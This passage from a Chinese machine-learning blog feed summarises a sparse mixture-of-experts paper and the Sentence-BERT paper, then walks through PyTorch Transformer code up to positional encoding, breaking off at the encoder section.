tokens/experts\)</span>，其中 CF 是容量因子，tokens 为一个 batch 是 token 总数。显然，理想的负载均衡情况下，CF 为 1 即可，不会有丢弃 token 现象。然而，由于很难做到如此理想的负载均衡，CF 为 1 时不可避免的会有丢失 token 现象出现，增大 CF 可缓解该现象。</p>
<p>下表展示了辅助 loss、token 丢弃率对性能的影响。出人意料的是，微调质量不会因为 10% 的 token 丢弃率受到实质性能影响。这与 Yang
et al. (2021) 的结论一致，即负载不平衡可能不会显着影响模型质量。</p>
<p><img src="drop-token.png"></p>
<h3 id="插入哨兵标记">插入哨兵标记</h3>
<p>结果如下图所示。不能提高泛化能力，但哨兵标记可以加速训练收敛。</p>
<p><img src="sentinel.png"></p>
<h2 id="设计指南">设计指南</h2>
<p>如何设计一个稀疏模型？专家数量、路由算法、容量系数如何决定？如何根据硬件调整？论文对此给出了建议。</p>
<ul>
<li>专家数量：建议每个 GPU 核心配备一名专家或更少，避免同核心专家数过多导致增多内存传输，降低效率。</li>
<li>容量因子和路由策略（Top-n）：越大性能越好，但计算、通信成本都会增加。论文中平衡训练速度和性能，选择 1.25 的 CF。</li>
</ul>
<p>详细的结果可以参考论文原文。</p>
<h2 id="实验结果">实验结果</h2>
<p>论文设计了一个 T5-Large 近似 FLOP 的 269B 的稀疏模型，在多个 NLP
任务中实现了 SOTA，包括情感分析（SST-2）、语义消歧（WIC）、句子相似度（MRPC、STS-B、QQP）等。</p>
<p>实验结果如下表所示，大部分都是 SOTA。值得注意的是，为简单起见，论文是在所有任务上联合微调的，而非单独微调。如果是单独微调效果可能会更好。</p>
<p><img src="exper-result.png"></p>
<h2 id="总结">总结</h2>
<p>本文针对稀疏专家网络训练的稳定性、质量等问题，做了多因素的定量实验，为相关实践提供了一份指南。</p>
<h2 id="参考">参考</h2>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>条件计算</category>
      </categories>
      <tags>
        <tag>MoE</tag>
        <tag>专家网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Sentence-BERT: 减小语义相似度的计算开销</title>
    <url>/blog/2022/04/04/Sentence-BERT/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>BERT、RoBERTa 此类预训练模型虽然能够提升语义文本相似度（STS）任务的性能，但是在某些场景下会带来巨大的计算开销。例如，利用 BERT 从 10000 个句子的集合中找到最相似的两个句子，需要进行约 5000 万次推理，大约 65 个小时。因此，《Sentence-BERT:
Sentence Embeddings using Siamese BERT-Networks》，来自 EMNLP
2019，提出了 Sentence-BERT（SBERT），使用孪生或三胞胎 BERT + 余弦相似度计算语义相似度。可以将上述例子的 65 小时降低至 5 秒钟，同时保证准确率。STS 和迁移任务上的实验证明，SBERT 和 SRoBERTa 已经成为句向量标识的 SOTA 方法。
<span id="more"></span></p>
<h2 id="介绍">介绍</h2>
<p>BERT 的结构限制了其不适用于某些任务：大规模文本相似度比较、聚类、信息检索。摘要中已经提到了第一种的例子。聚类和信息检索通常需要将句子映射为一个固定维度的向量，使得相似的句子在语义空间中相近。BERT 虽然也能将句子映射为特定的向量，例如取最后一层 [CLS] 的 token
embedding，或者做平均池化。但是，实验证明，这样的到的向量甚至差于 GloVe 嵌入的平均。</p>
<p>SBERT 通过以下步骤解决这个问题：</p>
<ol type="1">
<li><p>孪生 BERT 将句子映射为固定维度向量</p></li>
<li><p>使用相似度度量（余弦相似度、欧氏距离、曼哈顿距离...）</p></li>
</ol>
<p>换而言之，即取消两个句子同时馈入网络的要求，利用相似度度量控制学习得到好的单个句子的嵌入。结构如下图所示：</p>
<figure>
<img src="architecture.png" alt="结构">
<figcaption aria-hidden="true">结构</figcaption>
</figure>
<p>两个句子被分别编码 + 平均池化得到向量表证后，构建计算语义相似度的分类任务（左图）或者回归任务（有图）。</p>
<p>作者在 NLI 数据上微调 SBERT，在 7 个 STS 任务上，SBERT 取得了 11.7 个点的提升，相较于 InferSent 和 Universal
Sentence Encoder。在 SentEval 上，SBERT 分别取得了 2.1 和 2.6 个点的提升。</p>
<h2 id="方法">方法</h2>
<p>SBERT 的核心步骤已经在上面介绍了，但还有一些细节需要考虑：</p>
<ol type="1">
<li>如何得到固定维度的向量：[CLS]/ 平均池化 / 最大池化</li>
<li>训练目标：分类 / 回归 / 三元组</li>
</ol>
<p>其中，模型的结构（孪生、三胞胎）、训练目标与可用的训练数据息息相关。</p>
<p><strong>分类目标</strong>：将两个句子向量及逐元素差<span class="math inline"> \(u,v,|u-v|\)</span> 馈入 MLP，并进行 SoftMax 进行分类，公式为：
<span class="math display">\[
o_t=softmax(W_t(u,v,|u-v|))
\]</span> <strong> 回归目标</strong>：与分类类似，区别在于计算<span class="math inline"> \(u,v\)</span> 的余弦相似度，使用 MSE 损失。</p>
<p><strong>三元组目标</strong>：给定一个原始句子<span class="math inline"> \(a\)</span>，一个正面句子<span class="math inline"> \(p\)</span>，一个负面例子<span class="math inline"> \(n\)</span>，减小<span class="math inline"> \(a,p\)</span> 之间的距离，增大<span class="math inline"> \(a,n\)</span> 之间的距离，即要<strong>最小化下式的损失</strong>：
<span class="math display">\[
\max(||s_a-s_p||-||s_a-s_n||+\epsilon,0)
\]</span> 其中，<span class="math inline">\(s_x\)</span> 为句子<span class="math inline"> \(x\)</span> 的嵌入向量，<span class="math inline">\(||\cdot||\)</span> 为句子度量，<span class="math inline">\(\epsilon\)</span> 为边界，用以保证<span class="math inline"> \(s_p\)</span> 至少<span class="math inline"> \(\epsilon\)</span> 比<span class="math inline"> \(s_n\)</span> 更靠近<span class="math inline"> \(s_a\)</span>，即<span class="math inline"> \(||s_a-s_p||+\epsilon&lt;||s_a-s_n||\)</span>。当这个式子不成立时，损失为 0，参数不进行更新。实验中使用的距离度量为欧氏距离，<span class="math inline">\(\epsilon=1\)</span>。</p>
<h3 id="训练细节">训练细节</h3>
<p>作者使用 SNLI、Multi-Genre
NLI 数据集训练 SBERT。其中，SNLI 数据集由 57 万个句子对 + 标签组成，MultiNLI 由 43 万个句子对组成，带有文本蕴含信息。</p>
<h2 id="实验">实验</h2>
<p>在语义文本相似度任务上进行实验验证。传统方法通常学习一个（复杂的）回归函数，将句子嵌入映射到相似性分数。
然而，这些回归函数以句子对为输入，难以扩展且面临组合爆炸问题。SBERT 则总是使用余弦相似度来比较两个句子之间的相似度嵌入。
负曼哈顿距离和负欧几里得距离的实验结果也大致相同。</p>
<h3 id="无监督sts">无监督 STS</h3>
<p>不使用任何 STS 特定的训练数据。评估数据集为 STS tasks 2012 - 2016， STS
benchmark，SICK-Relatedness。每个数据集的句子对包含 0 到 5 的的语义关联标签。评估指标上（两个相似度分数），不使用皮尔逊相关系数（Pearson
correlation
coefficient），因为它主要衡量随机变量间的<strong>线性相关性</strong>。而是使用斯皮尔曼等级相关系数（Spearman's
rank correlation
coefficient），它可以衡量<strong>等级变量间的单调性</strong>，因而更适用于 STS 场景。毕竟两个分数间的相关性不一定是线性的。</p>
<p>实验结果如下表所示。可以看到 naive 的 BERT embedding 差于 GloVe
embedding，SBERT 和 SRoBERTa 几乎全面领先，除了 SICK-R。这可能与 Universal
Sentence Encoder 训练的新闻、问答等语料有关。</p>
<p><img src="unsupervised-result.png"></p>
<h3 id="监督sts">监督 STS</h3>
<p>使用 STS benchmark (STSb)
数据集进行训练。该数据集包括来自标题、新闻和论坛三个类别的 8,628
个句子对，分为训练集（5,749）、验证集（1,500）和测试集（1,379）。</p>
<p>实验结果如下表所示。作者实验了两种训练策略，只在 STSb 上进行训练和在 NLI 数据集上预训练，再在 STSb 数据集上微调。后者能够带来 1-2 个点的提升。可以看到 SBERT 和 BERT 之间的差距不大。</p>
<p><img src="supervised-result.png"></p>
<h3 id="争论方面的相似性">争论方面的相似性</h3>
<p>Argument Facet Similarity （AFS）语料库注释了来自社交媒体对话的 6,000
个句子论点对，涉及三个有争议的主题：枪支管制、同性婚姻和死刑。数据的标签范围从
0（“不同主题”）到 5（“完全等效”）。 AFS 语料库中的相似性概念与 SemEval
的 STS 数据集中的相似性概念完全不同。 STS 数据通常是描述性的，而 AFS
数据是对话中的争论性摘录。要被认为是相似的，争论不仅必须提出相似的主张，而且还必须提供相似的论证。此外，AFS
中句子之间的词汇差距要大得多。因此，简单的无监督方法以及最先进的 STS
系统在该数据集上表现不佳。</p>
<p>作者使用 10 折交叉验证和跨主题评估（2 个主题用于训练，剩余一个用于评估）进行实验验证。10
折交叉验证设置中的 SBERT 的性能几乎与 BERT 相当。但是，在跨主题评估中，
SBERT 的 Spearman 相关性下降了大约 7 个点的
。这可能是由于缺失主题的情况下，BERT 依然能够通过逐字符比较得到较好的结果，SBERT 只能从单一句子推断主题、主张等，这更具有挑战性。</p>
<p><img src="argument-result.png"></p>
<h3 id="维基百科章节">维基百科章节</h3>
<p>利用维基百科的章节构建三元组数据：<strong>假设文章同一部分中的句子在主题上比不同部分中的句子更接近</strong>，锚点和正例来自文章同一个部分，而负例来自同一篇文章的不同部分。作者在 180
万个训练三元组上训练 SBERT 一个 epoch，并在 222,957
个测试三元组上对其进行评估。测试三元组来自一组不同的 Wikipedia
文章。以准确率为评估指标。实验结果如下表所示。</p>
<p><img src="wikipedia-result.png"></p>
<p>可以看出，SBERT 明显优于 Dor 等人的 BiLSTM 方法。</p>
<h3 id="senteval">SentEval</h3>
<p>SentEval 是一个流行的工具包，用于评估句子嵌入的质量。
句子嵌入用作<strong>逻辑回归分类器的特征</strong>。 逻辑回归分类器在 10
折交叉验证设置中针对各种任务进行训练，并计算测试折的预测准确度。</p>
<p>尽管 SBERT 的句子嵌入的目标不是用于基于特征的迁移学习，微调是更好的方法。但是 SentEval 依然能够在不同任务上评估句子嵌入的质量。作者在 7 个 SentEval 的句子嵌入任务中比较了 SBERT 的性能：</p>
<ul>
<li>MR：电影评论情感预测</li>
<li> CR：客户产品评论的情绪预测</li>
<li> SUBJ：来自电影评论和情节句子的主题预测</li>
<li> MPQA：来自新闻专线的短语级别意见极性分类</li>
<li> SST：斯坦福情绪树库二分类</li>
<li> TREC ：来自 TREC 的细粒度问题类型分类</li>
<li> MRPC：来自平行新闻来源的微软研究院释义语料库</li>
</ul>
<p>实验结果如下表所示。可以看到 SBERT 在 5/7 的任务上取得了最优性能，带来平均两个点的性能提升。尽管这种迁移学习并非是 SBERT 的目标，SBERT 依然取得了 SOTA 的性能。SBERT
明显比 Universal Sentence Encoder 差的数据集是 TREC 数据集。 Universal
Sentence Encoder 在问答数据上进行了预训练，这似乎有利于 TREC
数据集的问题类型分类任务。</p>
<p><img src="senteval-result.png"></p>
<p>另外，这里的 BERT 的 [CLS] 优于 GloVe 嵌入平均，似乎与前文得到的结论相违背。这是因为任务设置不同。对于
STS
任务，论文使用余弦相似度来估计句子嵌入之间的相似度。余弦相似性平等地对待所有维度。相比之下，SentEval
将逻辑回归分类器与句子嵌入相匹配。这使得某些维度可以对分类结果产生更高或更低的影响。</p>
<p>观察上表还可以得出结论，BERT 的平均嵌入或者 [CLS] 符号嵌入搭配余弦相似度、欧氏距离、曼哈顿距离是不可行的。对于特征迁移学习，它们产生的结果也比
InferSent 或 Universal Sentence Encoder
稍差。然而，使用 SBERT 的孪生网络 + NLI 微调的方法能够得到 SOTA 的句嵌入。</p>
<h2 id="消融实验">消融实验</h2>
<p>作者对池化策略、训练目标、拼接结果（分类目标时使用）进行了消融实验。其中，NLI 对应分类任务，STSb 对应回归任务。结果如下表所示。</p>
<p><img src="ablation.png"></p>
<p>可以看到，分类任务下，池化策略影响不大，用于分类的特征拼接结果影响很大。InferSent 和 Universal
Sentence Encoder 都是使用<span class="math inline"> \((u,v,|u −v|,u
∗v)\)</span>，然而，在 SBERT 里，<span class="math inline">\(u
∗v\)</span> 的加入还会损失性能。其中，最重要的特征是逐元素差<span class="math inline"> \(|u - v|\)</span>。</p>
<p>在回归任务下，池化策略具有很大的影响：最大池化的表现比平均池化或
CLS-token 策略要差得多。</p>
<h2 id="计算效率">计算效率</h2>
<p>下表比较了不同模型在不同设备上每秒可以处理的句子嵌入。越高越好。可以看到 SBERT 在 GPU 上是最快的，相较于 InferSent 的 LSTM，这也得益于 Transformer 的并行性。</p>
<p><img src="computation-efficiency.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文还是非常扎实的。从非常现实的计算效率问题出发，使用简单的方法，在不同的任务上取得与 BERT 相似甚至超越 BERT 的性能。其影响力也不容小觑，时至今日已经有 2000 + 的引用。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>语义相似度</category>
      </categories>
      <tags>
        <tag>BERT</tag>
        <tag>语义相似度</tag>
      </tags>
  </entry>
  <entry>
    <title>Transformer-code</title>
    <url>/blog/2021/09/05/Transformer-code/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来读一下《<a href="https://arxiv.org/abs/1706.03762">Attention is
All You Need</a>》的代码，也就是 Transformer。pytorch 代码<a href="https://github.com/jadore801120/attention-is-all-you-need-pytorch">地址</a>)。</p>
<span id="more"></span>
<h2 id="目录结构">目录结构</h2>
<p>Transformer 文件夹下有以下文件：</p>
<ul>
<li>Constants.py：模型常量定义</li>
<li> Layers.py：编码器和解码器层定义</li>
<li> Models.py：模型定义</li>
<li> Modules.py：工具模块</li>
<li> Optim.py：优化模块</li>
<li> SubLayer.py：多头注意力机制等子层</li>
<li> Translator.py：翻译 beam search</li>
</ul>
<p>顶层目录下有以下文件：</p>
<ul>
<li>train.py：训练入口，实例化模型、优化器等，进行优化迭代</li>
<li> learn_bpe.py：bpe 学习词表</li>
<li> apply_bpe.py：使用 bpe 得到的词表将文本进行编码</li>
<li> translate.py：加载模型进行翻译</li>
</ul>
<p>下面逐一进行分析模型相关文件，剩下的文件等到下次再读吧。</p>
<h2 id="模型解析">模型解析</h2>
<p>下面按照依赖顺序对各文件进行解析。</p>
<h3 id="constants.py">Constants.py</h3>
<p>文件内容非常简单，分别为填充、未知、起始、终止四种 token 的定义。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">PAD_WORD = <span class="string">'&lt;blank&gt;'</span> <span class="comment"># 填充token</span></span><br><span class="line">UNK_WORD = <span class="string">'&lt;unk&gt;'</span> <span class="comment"># 未知token</span></span><br><span class="line">BOS_WORD = <span class="string">'&lt;s&gt;'</span> <span class="comment"># 起始token</span></span><br><span class="line">EOS_WORD = <span class="string">'&lt;/s&gt;'</span> <span class="comment"># 结束token</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="modules.py">Modules.py</h3>
<p>定义了标量化点乘注意力机制类。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScaledDotProductAttention</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Scaled Dot-Product Attention '''</span></span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, temperature, attn_dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.temperature = temperature <span class="comment"># softmax的温度系数，论文中为\sqrt d_k</span></span><br><span class="line">        self.dropout = nn.Dropout(attn_dropout) <span class="comment"># 原论文dropout比例即为0.1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, q, k, v, mask=<span class="literal">None</span></span>):</span></span><br><span class="line">		<span class="string">'''</span></span><br><span class="line"><span class="string">		q,k:  bsz x n_head x lq  x d_k</span></span><br><span class="line"><span class="string">		v: bsz x n_head x lq x d_v</span></span><br><span class="line"><span class="string">		'''</span></span><br><span class="line">        attn = torch.matmul(q / self.temperature, k.transpose(<span class="number">2</span>, <span class="number">3</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            attn = attn.masked_fill(mask == <span class="number">0</span>, -<span class="number">1e9</span>) <span class="comment"># 填充位置的注意力掩码，避免信息泄露等问题</span></span><br><span class="line"></span><br><span class="line">        attn = self.dropout(F.softmax(attn, dim=-<span class="number">1</span>)) <span class="comment"># 注意力的dropout</span></span><br><span class="line">        output = torch.matmul(attn, v) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output, attn</span><br></pre></td></tr></tbody></table></figure>
<h3 id="sublayers.py">SubLayers.py</h3>
<p>多头注意力机制定义：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MultiHeadAttention</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Multi-Head Attention module '''</span></span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	n_head：注意力头数</span></span><br><span class="line"><span class="string">	d_model：词嵌入向量维度</span></span><br><span class="line"><span class="string">	d_k：query,key向量维度</span></span><br><span class="line"><span class="string">	d_v：value向量维度，d_v*n_head即为注意力输出的维度</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n_head, d_model, d_k, d_v, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.n_head = n_head</span><br><span class="line">        self.d_k = d_k</span><br><span class="line">        self.d_v = d_v</span><br><span class="line">		<span class="comment"># query key value 矩阵</span></span><br><span class="line">        self.w_qs = nn.Linear(d_model, n_head * d_k, bias=<span class="literal">False</span>)</span><br><span class="line">        self.w_ks = nn.Linear(d_model, n_head * d_k, bias=<span class="literal">False</span>)</span><br><span class="line">        self.w_vs = nn.Linear(d_model, n_head * d_v, bias=<span class="literal">False</span>)</span><br><span class="line">        self.fc = nn.Linear(n_head * d_v, d_model, bias=<span class="literal">False</span>) <span class="comment">#全连接层</span></span><br><span class="line"></span><br><span class="line">        self.attention = ScaledDotProductAttention(temperature=d_k ** <span class="number">0.5</span>) <span class="comment">#注意力计算</span></span><br><span class="line"></span><br><span class="line">        self.dropout = nn.Dropout(dropout)</span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_model, eps=<span class="number">1e-6</span>) <span class="comment"># 层标准化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, q, k, v, mask=<span class="literal">None</span></span>):</span></span><br><span class="line"></span><br><span class="line">        d_k, d_v, n_head = self.d_k, self.d_v, self.n_head</span><br><span class="line">        sz_b, len_q, len_k, len_v = q.size(<span class="number">0</span>), q.size(<span class="number">1</span>), k.size(<span class="number">1</span>), v.size(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        residual = q</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Pass through the pre-attention projection: b x lq x (n*dv)</span></span><br><span class="line">        <span class="comment"># Separate different heads: b x lq x n x dv</span></span><br><span class="line">        q = self.w_qs(q).view(sz_b, len_q, n_head, d_k)</span><br><span class="line">        k = self.w_ks(k).view(sz_b, len_k, n_head, d_k)</span><br><span class="line">        v = self.w_vs(v).view(sz_b, len_v, n_head, d_v)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Transpose for attention dot product: b x n x lq x dv</span></span><br><span class="line">        q, k, v = q.transpose(<span class="number">1</span>, <span class="number">2</span>), k.transpose(<span class="number">1</span>, <span class="number">2</span>), v.transpose(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            mask = mask.unsqueeze(<span class="number">1</span>)   <span class="comment"># For head axis broadcasting.</span></span><br><span class="line">	    <span class="comment"># q为注意力的输出</span></span><br><span class="line">        q, attn = self.attention(q, k, v, mask=mask)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Transpose to move the head dimension back: b x lq x n x dv</span></span><br><span class="line">        <span class="comment"># Combine the last two dimensions to concatenate all the heads together: b x lq x (n*dv)</span></span><br><span class="line">        q = q.transpose(<span class="number">1</span>, <span class="number">2</span>).contiguous().view(sz_b, len_q, -<span class="number">1</span>)</span><br><span class="line">        q = self.dropout(self.fc(q))</span><br><span class="line">        q += residual</span><br><span class="line"></span><br><span class="line">        q = self.layer_norm(q)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> q, attn</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>前馈神经网络子层、残差层定义：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PositionwiseFeedForward</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A two-feed-forward-layer module '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_in, d_hid, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.w_1 = nn.Linear(d_in, d_hid) <span class="comment"># position-wise</span></span><br><span class="line">        self.w_2 = nn.Linear(d_hid, d_in) <span class="comment"># position-wise</span></span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_in, eps=<span class="number">1e-6</span>)</span><br><span class="line">        self.dropout = nn.Dropout(dropout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line"></span><br><span class="line">        residual = x</span><br><span class="line"></span><br><span class="line">        x = self.w_2(F.relu(self.w_1(x)))</span><br><span class="line">        x = self.dropout(x)</span><br><span class="line">        x += residual <span class="comment"># 残差计算</span></span><br><span class="line"></span><br><span class="line">        x = self.layer_norm(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="layers.py">Layers.py</h3>
<p>编码器层类（非常简单，将多头注意力机制与前馈神经网络拼接起来即可）：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">''' Define the Layers '''</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformer.SubLayers <span class="keyword">import</span> MultiHeadAttention, PositionwiseFeedForward</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncoderLayer</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Compose with two layers '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_model, d_inner, n_head, d_k, d_v, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(EncoderLayer, self).__init__()</span><br><span class="line">        self.slf_attn = MultiHeadAttention(n_head, d_model, d_k, d_v, dropout=dropout)</span><br><span class="line">        self.pos_ffn = PositionwiseFeedForward(d_model, d_inner, dropout=dropout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, enc_input, slf_attn_mask=<span class="literal">None</span></span>):</span></span><br><span class="line">        enc_output, enc_slf_attn = self.slf_attn(</span><br><span class="line">            enc_input, enc_input, enc_input, mask=slf_attn_mask)</span><br><span class="line">        enc_output = self.pos_ffn(enc_output)</span><br><span class="line">        <span class="keyword">return</span> enc_output, enc_slf_attn</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>解码器层类：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecoderLayer</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Compose with three layers '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_model, d_inner, n_head, d_k, d_v, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DecoderLayer, self).__init__()</span><br><span class="line">        self.slf_attn = MultiHeadAttention(n_head, d_model, d_k, d_v, dropout=dropout)</span><br><span class="line">        self.enc_attn = MultiHeadAttention(n_head, d_model, d_k, d_v, dropout=dropout) <span class="comment"># 解码器对编码器输出的注意力</span></span><br><span class="line">        self.pos_ffn = PositionwiseFeedForward(d_model, d_inner, dropout=dropout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, dec_input, enc_output,</span></span></span><br><span class="line"><span class="params"><span class="function">            slf_attn_mask=<span class="literal">None</span>, dec_enc_attn_mask=<span class="literal">None</span></span>):</span></span><br><span class="line">        dec_output, dec_slf_attn = self.slf_attn(</span><br><span class="line">            dec_input, dec_input, dec_input, mask=slf_attn_mask) <span class="comment"># 解码器的自注意力</span></span><br><span class="line">        dec_output, dec_enc_attn = self.enc_attn(</span><br><span class="line">            dec_output, enc_output, enc_output, mask=dec_enc_attn_mask) <span class="comment"># 解码器对编码器输出的注意力</span></span><br><span class="line">        dec_output = self.pos_ffn(dec_output) <span class="comment"># 前馈神经网络</span></span><br><span class="line">        <span class="keyword">return</span> dec_output, dec_slf_attn, dec_enc_attn</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="models.py">Models.py</h3>
<p>Models.py 是模型定义核心文件。</p>
<p>工具函数：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pad_mask</span>(<span class="params">seq, pad_idx</span>):</span> <span class="comment"># 获取序列的MASK（填充位置为0）</span></span><br><span class="line">    <span class="keyword">return</span> (seq != pad_idx).unsqueeze(-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_subsequent_mask</span>(<span class="params">seq</span>):</span> <span class="comment"># 获取序列的所有MASK（长度为1,2,...n）</span></span><br><span class="line">    <span class="string">''' For masking out the subsequent info. '''</span></span><br><span class="line">    sz_b, len_s = seq.size()</span><br><span class="line">    subsequent_mask = (<span class="number">1</span> - torch.triu(</span><br><span class="line">        torch.ones((<span class="number">1</span>, len_s, len_s), device=seq.device), diagonal=<span class="number">1</span>)).<span class="built_in">bool</span>()</span><br><span class="line">    <span class="keyword">return</span> subsequent_mask</span><br></pre></td></tr></tbody></table></figure>
<p>位置编码：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PositionalEncoding</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_hid, n_position=<span class="number">200</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(PositionalEncoding, self).__init__()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Not a parameter</span></span><br><span class="line">        <span class="comment"># 成员变量无法保存在模型参数中且无法通过.cuda()转移到gpu上，register_buffer注册后则可以</span></span><br><span class="line">        self.register_buffer(<span class="string">'pos_table'</span>, self._get_sinusoid_encoding_table(n_position, d_hid))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_sinusoid_encoding_table</span>(<span class="params">self, n_position, d_hid</span>):</span></span><br><span class="line">        <span class="string">''' Sinusoid position encoding table '''</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> make it with torch instead of numpy</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get_position_angle_vec</span>(<span class="params">position</span>):</span></span><br><span class="line">            <span class="keyword">return</span> [position / np.power(<span class="number">10000</span>, <span class="number">2</span> * (hid_j // <span class="number">2</span>) / d_hid) <span class="keyword">for</span> hid_j <span class="keyword">in</span> <span class="built_in">range</span>(d_hid)]</span><br><span class="line"></span><br><span class="line">        sinusoid_table = np.array([get_position_angle_vec(pos_i) <span class="keyword">for</span> pos_i <span class="keyword">in</span> <span class="built_in">range</span>(n_position)])</span><br><span class="line">        sinusoid_table[:, <span class="number">0</span>::<span class="number">2</span>] = np.sin(sinusoid_table[:, <span class="number">0</span>::<span class="number">2</span>])  <span class="comment"># dim 2i</span></span><br><span class="line">        sinusoid_table[:, <span class="number">1</span>::<span class="number">2</span>] = np.cos(sinusoid_table[:, <span class="number">1</span>::<span class="number">2</span>])  <span class="comment"># dim 2i+1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> torch.FloatTensor(sinusoid_table).unsqueeze(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> x + self.pos_table[:, :x.size(<span class="number">1</span>)].clone().detach()</span><br></pre></td></tr></tbody></table></figure>
<p>Transformer 编码器：</p>
